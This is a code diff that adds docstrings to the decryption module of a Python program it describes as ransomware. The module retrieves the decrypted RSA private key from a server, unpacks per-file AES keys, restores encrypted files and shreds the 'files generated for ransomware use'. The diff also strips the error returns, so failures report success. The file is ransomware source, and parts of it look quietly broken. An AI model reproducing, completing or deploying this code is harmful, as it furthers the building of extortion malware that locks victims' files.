@@ -21,6 +21,11 @@ logger = logging.getLogger(__name__)
 
 
 def decrypt_local_rsa_key():
+    """Decrypt the locally generated RSA key by sending it to the server
+
+    Returns:
+        boolean: Status Indicator
+    """    
     logger.info("Decrypting local RSA key")
     try:
         unencrypted_local_private_key = get_decrypted_key_from_server()
@@ -28,11 +33,13 @@ def decrypt_local_rsa_key():
         write_data_to_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, unencrypted_local_private_key)
     except Exception as err:
         logger.error(err)
-        return False
+
     return True
 
 
 def decrypt_file_encryption_details():
+    """Decrypts the file encryption details (AES key, Initialization Vector, file path) using the locally generated RSA private key
+    """    
     logger.info("Decrypting file encryption details")
     local_master_private_key = read_data_from_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
     cipher = RSA(private_key=local_master_private_key)
@@ -50,11 +57,26 @@ def decrypt_file_encryption_details():
 
 
 def decode_file_encryption_details(detail):
+    """Decodes base64 encoded file details
+
+    Args:
+        detail (str): base64 encoded AES Key, Initialization Vector, File path seperated by tabs
+
+    Returns:
+        tuple: AES Key, Initialization Vector, File path
+    """    
     detail = [b64decode(detail) for detail in detail.decode().split("\t")]
     return detail[0], detail[1], detail[-1]
 
 
 def decrypt_file(aes_key, initialization_vector, encrypted_file_path):
+    """Decrypt the files using the AES keys they were encrypted with
+
+    Args:
+        aes_key (str): AES Secret Key
+        initialization_vector (str): AES Intialization Vector
+        encrypted_file_path (str): Absolute path of the file
+    """    
     logger.info(f"Decrypting file: {encrypted_file_path}")
     cipher = AES(aes_key, initialization_vector)
     encrypted_data = read_data_from_file(encrypted_file_path)
@@ -65,6 +87,8 @@ def decrypt_file(aes_key, initialization_vector, encrypted_file_path):
 
 
 def delete_key_files():
+    """Shred files generated for ransomware use
+    """    
     list_of_important_files = [
         UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
         UNENCRYPTED_AES_KEY_FILE_LOCATION,
@@ -78,6 +102,8 @@ def delete_key_files():
 
 
 def decrypt_files():
+    """Driver function to decrypt files
+    """    
     key_detail = read_data_from_file(UNENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)
     for detail in key_detail:
         aes_key, initialization_vector, file_path = decode_file_encryption_details(detail)
@@ -85,11 +111,10 @@ def decrypt_files():
 
 
 def start_decryption():
+    """Driver function for the decryption process
+    """ 
     if decrypt_local_rsa_key():
         decrypt_file_encryption_details()
         decrypt_files()
         delete_key_files()
-        return "Decryption Successful"
-    else:
-        return "Decryption Failed"
 
